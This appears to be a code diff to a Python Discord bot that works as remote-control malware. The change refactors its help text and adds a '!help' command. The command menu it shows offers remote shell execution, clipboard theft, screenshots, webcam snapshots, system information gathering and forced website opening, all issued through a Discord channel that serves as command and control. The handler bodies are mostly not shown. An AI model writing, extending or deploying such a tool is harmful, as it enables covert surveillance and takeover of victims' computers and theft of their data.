@@ -23,22 +23,22 @@ class DiscordBotClient(discord.Client):
     def __init__(self, target_channel_id, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self.target_channel_id = target_channel_id
+        self.command_text = "\n".join(sorted([
+            "!help                   -> Show available commands",
+            "!alert       <message>  -> Trigger message box",
+            "!clipboard              -> Get clipboard content",
+            "!execute     <command>  -> Execute a shell command",
+            "!screenshot             -> Take a screenshot",
+            "!sysinfo                -> Get system information",
+            "!webcam                 -> Get webcam snapshot",
+            "!website     <url>      -> Open a website",
+            "!voice       <text>     -> Read text out loud",
+        ]))
 
     async def on_ready(self):
         channel = self.get_channel(self.target_channel_id)
         if channel:
-            commands = [
-                "!alert       <message>  -> Trigger message box",
-                "!clipboard              -> Get clipboard content",
-                "!execute     <command>  -> Execute a shell command",
-                "!screenshot             -> Take a screenshot",
-                "!sysinfo                -> Get system information",
-                "!webcam                 -> Get webcam snapshot",
-                "!website     <url>      -> Open a website",
-                "!voice       <text>     -> Read text out loud",
-            ]
-            command_text = "\n".join(sorted(commands))
-            await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{command_text}```")
+            await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{self.command_text}```")
 
     async def on_message(self, message):
         if message.author == self.user:
@@ -70,7 +70,10 @@ class DiscordBotClient(discord.Client):
             else:
                 await handler(message.channel, args)
         elif command.startswith("!"):
-            await message.channel.send(f"Unknown command: `{command}`.")
+            if command == "!help":
+                await message.channel.send(f"Here are the available commands:\n```{self.command_text}```")
+            else:
+                await message.channel.send(f"Unknown command: `{command}`.\nType `!help` for a list of commands.")
 
     async def handle_system_info(self, channel, _):
         sys_info = get_sys_info()
